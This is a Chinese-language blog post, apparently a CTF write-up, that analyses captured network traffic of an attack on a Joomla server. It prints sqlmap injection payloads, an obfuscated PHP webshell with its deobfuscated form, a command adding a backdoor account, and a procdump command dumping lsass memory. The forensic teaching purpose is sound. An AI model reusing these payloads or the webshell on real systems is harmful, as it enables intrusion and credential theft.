@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  
+  <title>2018西普杯铁三流量分析 | R1ght0us&#39;s Blog</title>
+  
+  
+  <meta name="description" content="贪财好色，一身正气">
+  
+
+  <link rel="alternate" href="/atom.xml" title="R1ght0us's Blog">
+
+  <meta name="HandheldFriendly" content="True">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <!-- meta -->
+  
+  <!-- link -->
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.6.3/css/all.min.css">
+
+  
+
+  
+  <link rel="stylesheet" href="/style.css">
+  
+
+  
+
+
+
+  <script>
+    function setLoadingBarProgress(num) {
+      document.getElementById('loading-bar').style.width=num+"%";
+    }
+  </script>
+
+  
+  
+    <!-- ba -->
+    <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?fd2b3186d71bc76ab3732304151f34a0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+  
+</head>
+
+<body>
+    <div id="loading-bar-wrapper">
+  <div id="loading-bar" class="pure"></div>
+</div>
+
+    <script>setLoadingBarProgress(20)</script>
+    <header class="l_header pure">
+	<div class="wrapper">
+		<div class="nav-main container container--flex">
+      <a class="logo flat-box" href="/">
+        
+          R1ght0us's Blog
+        
+      </a>
+			<div class="menu">
+				<ul class="h-list">
+          
+  					
+  						<li>
+								<a id="home" class="nav flat-box" href="/">
+									<i class="fas fa-home fa-fw"></i>&nbsp;主页
+								</a>
+							</li>
+      			
+  						<li>
+								<a id="archives" class="nav flat-box" href="/archives/">
+									<i class="fas fa-archive fa-fw"></i>&nbsp;归档
+								</a>
+							</li>
+      			
+  						<li>
+								<a id="about" class="nav flat-box" href="/about/">
+									<i class="fas fa-user fa-fw"></i>&nbsp;关于我
+								</a>
+							</li>
+      			
+      		
+				</ul>
+			</div>
+
+			
+				<div class="m_search">
+					<form name="searchform" class="form u-search-form">
+						<input type="text" class="input u-search-input" placeholder="搜索">
+						<span class="icon"><i class="fas fa-search fa-fw"></i></span>
+					</form>
+				</div>
+			
+			<ul class="switcher h-list">
+				
+					<li class="s-search"><a class="fas fa-search fa-fw" href="javascript:void(0)"></a></li>
+				
+				<li class="s-menu"><a class="fas fa-bars fa-fw" href="javascript:void(0)"></a></li>
+			</ul>
+		</div>
+
+		<div class="nav-sub container container--flex">
+			<a class="logo flat-box"></a>
+			<ul class="switcher h-list">
+				<li class="s-comment"><a class="flat-btn fas fa-comments fa-fw" href="javascript:void(0)"></a></li>
+				<li class="s-toc"><a class="flat-btn fas fa-list fa-fw" href="javascript:void(0)"></a></li>
+			</ul>
+		</div>
+	</div>
+</header>
+	<aside class="menu-phone">
+    <header>
+		<nav class="menu">
+      <ul>
+          
+              
+                  <li>
+										<a id="home" class="nav flat-box" href="/">
+											<i class="fas fa-home fa-fw"></i>&nbsp;主页
+										</a>
+                  </li>
+              
+                  <li>
+										<a id="archives" class="nav flat-box" href="/archives/">
+											<i class="fas fa-archive fa-fw"></i>&nbsp;归档
+										</a>
+                  </li>
+              
+                  <li>
+										<a id="about" class="nav flat-box" href="/about/">
+											<i class="fas fa-user fa-fw"></i>&nbsp;关于我
+										</a>
+                  </li>
+              
+       
+      </ul>
+		</nav>
+    </header>
+	</aside>
+
+    <script>setLoadingBarProgress(40);</script>
+    <div class="l_body">
+    <div class='container clearfix'>
+        <div class='l_main'>
+            <article id="post" class="post white-box article-type-post" itemscope="" itemprop="blogPost">
+  
+<section class="meta">
+  
+  <div class="meta" id="header-meta">
+    
+      
+          <h1 class="title">2018西普杯铁三流量分析</h1>
+      
+    
+
+    
+      <time class="metatag time">
+        <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;2020-05-27
+      </time>
+    
+
+    
+      
+    
+    <div class="metatag cats">
+        <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>&nbsp;<a class="categories" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+    
+
+    
+      
+        <div class="metatag browse busuanzi"><i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+          &nbsp;<span id="busuanzi_value_page_pv"><i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span>
+        </div>
+      
+    
+
+    
+
+  </div>
+</section>
+
+    <section class="article typo">
+      <div class="article-entry" itemprop="articleBody">
+        <p>经典流量分析题目，每次都要拿出来用索性整理好下次方便点<br><a id="more"></a></p>
+<h1 id="本文所用的WireShark语法"><a href="#本文所用的WireShark语法" class="headerlink" title="本文所用的WireShark语法"></a>本文所用的WireShark语法</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http 显示出所有的HTTP协议数据</span><br><span class="line">ip.addr == xxxx 显示出所有数据中地址为xxxx的包</span><br><span class="line">ip.src == xxxx 显示出所有数据中源地址为xxxx的包</span><br><span class="line">ip.dst == xxxx 显示出所有数据中目的地址为xxxx的包</span><br><span class="line">mysql 显示所有的MySQL协议</span><br></pre></td></tr></table></figure>
+<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h2 id="0x01-黑客攻击的第一个受害主机的网卡IP地址"><a href="#0x01-黑客攻击的第一个受害主机的网卡IP地址" class="headerlink" title="0x01 黑客攻击的第一个受害主机的网卡IP地址"></a>0x01 黑客攻击的第一个受害主机的网卡IP地址</h2><p>过滤出http协议后简单翻阅数据包发现，一个主机对一个服务器进行了请求，之后又发现该主机对服务器进行SQL注入,从而确定黑客IP为： <em>202.1.1.2</em> 。<br><img src="/2020/05/27/2018西普杯铁三流量分析/1.jpg" alt=""></p>
+<h2 id="0x02-黑客对URL的哪一个参数实施了SQL注入"><a href="#0x02-黑客对URL的哪一个参数实施了SQL注入" class="headerlink" title="0x02 黑客对URL的哪一个参数实施了SQL注入"></a>0x02 黑客对URL的哪一个参数实施了SQL注入</h2><p>根据前面看到的SQL注入很明显的发现了黑客对 <strong>list[select]</strong> 进行了注入</p>
+<h2 id="0x03-第一个受害主机网站数据库的表前缀"><a href="#0x03-第一个受害主机网站数据库的表前缀" class="headerlink" title="0x03 第一个受害主机网站数据库的表前缀"></a>0x03 第一个受害主机网站数据库的表前缀</h2><p>根据前面看到的SQL注入，然后进行追踪HTTP流看到服务器报错使之表前缀显示了出来<br><img src="/2020/05/27/2018西普杯铁三流量分析/2.jpg" alt=""></p>
+<p>简单看一下SQLMAP如何进行注入的<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XfqR=2916 AND 1=1 UNION ALL <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="literal">NULL</span>,<span class="string">'&lt;script&gt;alert("XSS")&lt;/script&gt;'</span>,table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> <span class="number">2</span>&gt;<span class="number">1</span><span class="comment">--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到 <em>XfqR=2916</em> 不成立导致报错产生，从而出来敏感信息。</p>
+<h2 id="0x04-第一个受害主机网站数据库的名字"><a href="#0x04-第一个受害主机网站数据库的名字" class="headerlink" title="0x04 第一个受害主机网站数据库的名字"></a>0x04 第一个受害主机网站数据库的名字</h2><p>黑客最后一条数据爆出来肯定存在相应的数据库名，例如 <code>from A.B</code>A是数据库名，B是表名。查看最后一条SQL注入信息<br><img src="/2020/05/27/2018西普杯铁三流量分析/3.jpg" alt=""><br>解码注入信息可得<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(username <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">22</span>) <span class="keyword">FROM</span> joomla.ajtuc_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x71716b6b71</span>),<span class="number">4235</span>))</span><br></pre></td></tr></table></figure></p>
+<p>可以看到数据库名以及表名前缀，更加证实了前面一道题的可靠性。</p>
+<h2 id="0x05-Joomla后台管理员的密码是多少"><a href="#0x05-Joomla后台管理员的密码是多少" class="headerlink" title="0x05 Joomla后台管理员的密码是多少"></a>0x05 Joomla后台管理员的密码是多少</h2><p>使用<code>ip.dst == 192.168.1.8 &amp;&amp; http contains &quot;password&quot;</code>查看得到三个数据<br><img src="/2020/05/27/2018西普杯铁三流量分析/4.jpg" alt=""></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status: 500 XPATH syntax error: 'qqzvq$2y$10$lXujU7XaUviJDigqqkkq' SQL=<span class="keyword">SELECT</span> (UPDATEXML(<span class="number">5928</span>,<span class="keyword">CONCAT</span>(<span class="number">0x2e</span>,<span class="number">0x71717a7671</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">password</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">22</span>) <span class="keyword">FROM</span> joomla.ajtuc_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x71716b6b71</span>),<span class="number">7096</span>)),uc.name <span class="keyword">AS</span> editor <span class="keyword">FROM</span> <span class="string">`ajtuc_ucm_history`</span> <span class="keyword">AS</span> h <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> ajtuc_users <span class="keyword">AS</span> uc <span class="keyword">ON</span> uc.id = h.editor_user_id <span class="keyword">WHERE</span> <span class="string">`h`</span>.<span class="string">`ucm_item_id`</span> = <span class="number">1</span> <span class="keyword">AND</span> <span class="string">`h`</span>.<span class="string">`ucm_type_id`</span> = <span class="number">1</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">`h`</span>.<span class="string">`save_date`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Status</span>: <span class="number">500</span> XPATH syntax <span class="keyword">error</span>: <span class="string">'qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq'</span> <span class="keyword">SQL</span>=<span class="keyword">SELECT</span> (UPDATEXML(<span class="number">3613</span>,<span class="keyword">CONCAT</span>(<span class="number">0x2e</span>,<span class="number">0x71717a7671</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">password</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">23</span>,<span class="number">22</span>) <span class="keyword">FROM</span> joomla.ajtuc_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x71716b6b71</span>),<span class="number">7939</span>)),uc.name <span class="keyword">AS</span> editor <span class="keyword">FROM</span> <span class="string">`ajtuc_ucm_history`</span> <span class="keyword">AS</span> h <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> ajtuc_users <span class="keyword">AS</span> uc <span class="keyword">ON</span> uc.id = h.editor_user_id <span class="keyword">WHERE</span> <span class="string">`h`</span>.<span class="string">`ucm_item_id`</span> = <span class="number">1</span> <span class="keyword">AND</span> <span class="string">`h`</span>.<span class="string">`ucm_type_id`</span> = <span class="number">1</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">`h`</span>.<span class="string">`save_date`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Status</span>: <span class="number">500</span> XPATH syntax <span class="keyword">error</span>: <span class="string">'qqzvqzi/8B2QRD7qIlDJeqqkkq'</span> <span class="keyword">SQL</span>=<span class="keyword">SELECT</span> (UPDATEXML(<span class="number">8949</span>,<span class="keyword">CONCAT</span>(<span class="number">0x2e</span>,<span class="number">0x71717a7671</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">password</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">45</span>,<span class="number">22</span>) <span class="keyword">FROM</span> joomla.ajtuc_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x71716b6b71</span>),<span class="number">3079</span>)),uc.name <span class="keyword">AS</span> editor <span class="keyword">FROM</span> <span class="string">`ajtuc_ucm_history`</span> <span class="keyword">AS</span> h <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> ajtuc_users <span class="keyword">AS</span> uc <span class="keyword">ON</span> uc.id = h.editor_user_id <span class="keyword">WHERE</span> <span class="string">`h`</span>.<span class="string">`ucm_item_id`</span> = <span class="number">1</span> <span class="keyword">AND</span> <span class="string">`h`</span>.<span class="string">`ucm_type_id`</span> = <span class="number">1</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">`h`</span>.<span class="string">`save_date`</span></span><br></pre></td></tr></table></figure>
+<p>随后看到相关加密字符串：<code>$2y$10$lXujU7XaUviJDigFMzKy6.wx7EMCBqpzrJdn7zi/8B2QRD7qIlDJe</code></p>
+<h2 id="0x06-黑客第一次获得的php木马的密码是什么"><a href="#0x06-黑客第一次获得的php木马的密码是什么" class="headerlink" title="0x06 黑客第一次获得的php木马的密码是什么"></a>0x06 黑客第一次获得的php木马的密码是什么</h2><p>还是根据<code>(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http</code>发现有一个奇怪的kkkaaa.php文件，其中发现POST方式打开可得一个经典的WEBSHELL，发现密码为 <em>zzz</em>   </p>
+<p><img src="/2020/05/27/2018西普杯铁三流量分析/5.jpg" alt=""></p>
+<h2 id="0x07-黑客第二次上传php木马是什么时间"><a href="#0x07-黑客第二次上传php木马是什么时间" class="headerlink" title="0x07 黑客第二次上传php木马是什么时间"></a>0x07 黑客第二次上传php木马是什么时间</h2><p>因为黑客又上传了一次马，所以索性按照POST过滤查看<code>(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http.request.method==post</code> 发现其中一个数据包所含大量的16进制数据：<br><img src="/2020/05/27/2018西普杯铁三流量分析/6.jpg" alt=""></p>
+<p>将其提取出来，转换如下所示：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p=<span class="string">'l&gt;]ower";$i&gt;]=$m[1][0].$m[1]&gt;][1];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),0&gt;],3))&gt;];$f=$s&gt;]l($s&gt;]s(md5'</span>;</span><br><span class="line">$d=<span class="string">']q=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll("/(&gt;][\\w]&gt;])[\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\d]))?,?/",&gt;'</span>;</span><br><span class="line">$W=<span class="string">'),$ss(&gt;]$s[&gt;]$i],&gt;]0,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end_&gt;]&gt;]clean();$d=&gt;]base'</span>;</span><br><span class="line">$e=<span class="string">']T_LANGUAGE"];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u["&gt;]query"],$&gt;]q);$&gt;'</span>;</span><br><span class="line">$E=<span class="string">'&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt("&lt;$k&gt;$d&lt;&gt;]/$k&gt;"&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;'</span>;</span><br><span class="line">$t=<span class="string">'($i.&gt;]$kf),0,3&gt;]));$p&gt;]="";fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;'</span>;</span><br><span class="line">$M=<span class="string">']$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s="substr";$sl="s&gt;]&gt;]trto'</span>;</span><br><span class="line">$P=<span class="string">']f(s&gt;]tr&gt;]pos($p&gt;],$h)===0)&#123;$s[&gt;]$i]="";$p&gt;]=$ss($&gt;]p,3);&gt;]&#125;if(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;'</span>;</span><br><span class="line">$j=str_replace(<span class="string">'fr'</span>,<span class="string">''</span>,<span class="string">'cfrrfreatfrfre_funcfrtfrion'</span>);</span><br><span class="line">$k=<span class="string">'];&#125;&#125;re&gt;]&gt;]turn $o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]"HTTP&gt;]_REFERE&gt;]R"];$ra&gt;]=@&gt;]$r["&gt;]HTTP_A&gt;]CC&gt;]EP&gt;'</span>;</span><br><span class="line">$g=<span class="string">'"";for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;'</span>;</span><br><span class="line">$R=<span class="string">'$k&gt;]h="cb4&gt;]2";$kf="e130"&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o='</span>;</span><br><span class="line">$Q=<span class="string">']s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;'</span>;</span><br><span class="line">$v=<span class="string">']mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array("/_/","/-/"),arr&gt;]ay(&gt;]"/","+"&gt;]'</span>;</span><br><span class="line">$x=str_replace(<span class="string">'&gt;]'</span>,<span class="string">''</span>,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);</span><br><span class="line">$N=$j(<span class="string">''</span>,$x);$N(); </span><br><span class="line"><span class="comment">//j=create_function;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>简单的反混淆如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$kh=<span class="string">"cb42"</span>;</span><br><span class="line">$kf=<span class="string">"e130"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">($t,$k)</span> </span>&#123;</span><br><span class="line">	$c=strlen($k);</span><br><span class="line">	$l=strlen($t);</span><br><span class="line">	$o=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;$l;) &#123;</span><br><span class="line">		<span class="keyword">for</span> ($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123;</span><br><span class="line">			$o.=$t &#123;</span><br><span class="line">				$i</span><br><span class="line">			&#125;</span><br><span class="line">			^$k &#123;</span><br><span class="line">				$j</span><br><span class="line">			&#125;</span><br><span class="line">			;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line">$r=$_SERVER;</span><br><span class="line">$rr=@$r[<span class="string">"HTTP_REFERER"</span>];</span><br><span class="line">$ra=@$r[<span class="string">"HTTP_ACCEPT_LANGUAGE"</span>];</span><br><span class="line"><span class="keyword">if</span>($rr&amp;&amp;$ra) &#123;</span><br><span class="line">	$u=parse_url($rr);</span><br><span class="line">	parse_str($u[<span class="string">"query"</span>],$q);</span><br><span class="line">	$q=array_values($q);</span><br><span class="line">	preg_match_all(<span class="string">"/([\w])[\w-]+(?:;q=0.([\d]))?,?/"</span>,$ra,$m);</span><br><span class="line">	<span class="keyword">if</span>($q&amp;&amp;$m) &#123;</span><br><span class="line">		@session_start();</span><br><span class="line">		$s=&amp;$_SESSION;</span><br><span class="line">		$ss=<span class="string">"substr"</span>;</span><br><span class="line">		$sl=<span class="string">"strtolower"</span>;</span><br><span class="line">		$i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">		$h=$sl($ss(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">		$f=$sl($ss(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">		$p=<span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> ($z=<span class="number">1</span>;$z$d<span class="string">");@session_destroy();&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure></p>
+<p>因此基本可以确定第二个木马就是在这个时间上传的：<br><em>Feb  7, 2018 17:20:44.248365000 中国标准时间</em></p>
+<h2 id="0x08-第二次上传的木马通过HTTP协议中的哪个头传递数据"><a href="#0x08-第二次上传的木马通过HTTP协议中的哪个头传递数据" class="headerlink" title="0x08 第二次上传的木马通过HTTP协议中的哪个头传递数据"></a>0x08 第二次上传的木马通过HTTP协议中的哪个头传递数据</h2><p>由于上部分的马大概可以看到发现有两个头部进行了变化<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$rr=@$r[<span class="string">"HTTP_REFERER"</span>];</span><br><span class="line">$ra=@$r[<span class="string">"HTTP_ACCEPT_LANGUAGE"</span>];</span><br></pre></td></tr></table></figure></p>
+<p>查看后续数据包，发现包头Accept-Language比较正常，然而Referer看起来有点诡异<br><img src="/2020/05/27/2018西普杯铁三流量分析/7.jpg" alt=""><br>因此可的木马通过Referer传递协议</p>
+<h2 id="0x09-内网主机的mysql用户名和请求连接的密码hash是多少"><a href="#0x09-内网主机的mysql用户名和请求连接的密码hash是多少" class="headerlink" title="0x09 内网主机的mysql用户名和请求连接的密码hash是多少"></a>0x09 内网主机的mysql用户名和请求连接的密码hash是多少</h2><p>直接搜索mysql过滤，直到第四个包才发现了mysql有关的东西，简单的查看发现黑客是通过爆破才找到的密码，那么直接拉到最后一条爆破记录看到<br><img src="/2020/05/27/2018西普杯铁三流量分析/8.jpg" alt=""><br>用户名密码为<br>admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4</p>
+<h2 id="0x10-php代理第一次被使用时最先连接了哪个IP地址"><a href="#0x10-php代理第一次被使用时最先连接了哪个IP地址" class="headerlink" title="0x10 php代理第一次被使用时最先连接了哪个IP地址"></a>0x10 php代理第一次被使用时最先连接了哪个IP地址</h2><p>再将其第四个数据包重新过滤为http发现有一个tunnel.php文件里面清晰可见了代理IP为4.2.2.2<br><img src="/2020/05/27/2018西普杯铁三流量分析/9.jpg" alt=""></p>
+<h2 id="0x11-黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候"><a href="#0x11-黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候" class="headerlink" title="0x11 黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候"></a>0x11 黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候</h2><p>获取系统可得为WINDOWS，查询目录文件命令就是 <strong>dir</strong> ,过滤查询语句就为:<code>ip.addr==192.168.1.8 &amp;&amp; http contains &quot;dir&quot;</code><br><img src="/2020/05/27/2018西普杯铁三流量分析/10.jpg" alt=""><br>时间就是： <em>18:36:59.770782</em>    </p>
+<h2 id="0x12-黑客在内网主机中添加的用户名和密码是多少"><a href="#0x12-黑客在内网主机中添加的用户名和密码是多少" class="headerlink" title="0x12 黑客在内网主机中添加的用户名和密码是多少"></a>0x12 黑客在内网主机中添加的用户名和密码是多少</h2><p>往后翻相应的数据包，由于之前的WEBSHELL特征我们能够看到响应的数据包未曾进行加密，所以查看回来的数据包发现黑客执行了 <strong>net user</strong> 命令<br><img src="/2020/05/27/2018西普杯铁三流量分析/11.jpg" alt=""><br>解密流量包发现黑可执行的查看用户命令<br><img src="/2020/05/27/2018西普杯铁三流量分析/12.jpg" alt=""><br>那么往下查数据包，解密流量包看到添加用户<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span>/d"C:\phpStudy\WWW\b2evolution\install\test\"&amp;<span class="built_in">net</span> user kaka kaka /add&amp;<span class="built_in">echo</span> [S]&amp;<span class="built_in">cd</span>&amp;<span class="built_in">echo</span> [E]</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/05/27/2018西普杯铁三流量分析/13.jpg" alt=""><br>可以看到添加用户密码为 <strong>kaka:kaka</strong></p>
+<h2 id="0x13-黑客从内网服务器中下载下来的文件名"><a href="#0x13-黑客从内网服务器中下载下来的文件名" class="headerlink" title="0x13 黑客从内网服务器中下载下来的文件名"></a>0x13 黑客从内网服务器中下载下来的文件名</h2><p>继续往后翻记录看到一条dump.exe的数据<br><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;procdump.exe -accepteula -ma lsass.exe&amp;echo [S]&amp;cd&amp;echo [E]</code><br>继续后看发现一个.dmp文件以及后面大量的相同类型的包猜测此dmp是黑客下载的东西<br><img src="/2020/05/27/2018西普杯铁三流量分析/14.jpg" alt="">  </p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ol>
+<li><a href="https://skysec.top/2018/05/30/2018.5.5%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">sky.blog</a></li>
+<li><a href="http://shaobaobaoer.cn/archives/638/2018-5-5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B-wp" target="_blank" rel="noopener">shaobaobaoer.blog</a></li>
+</ol>
+
+      </div>
+        
+          <section class="meta" id="footer-meta">
+            
+              <time class="metatag time" itemprop="dateUpdated" datetime="2020-05-27T20:17:36+08:00" content="2020-05-27"><i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>
+                &nbsp;2020-05-27
+              </time>
+            
+            
+                
+                <div class="metatag tags"><a class="tag" href="/tags/MISC/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>&nbsp;MISC</a></div> <div class="metatag tags"><a class="tag" href="/tags/比赛WP/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>&nbsp;比赛WP</a></div> <div class="metatag tags"><a class="tag" href="/tags/流量分析/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>&nbsp;流量分析</a></div>
+            
+            
+              
+  <div class="metatag share -mob-share-list">
+    <i class="left fas fa-share-alt fa-fw" aria-hidden="true"></i>
+    <div class="-mob-share-list share-body">
+      
+        
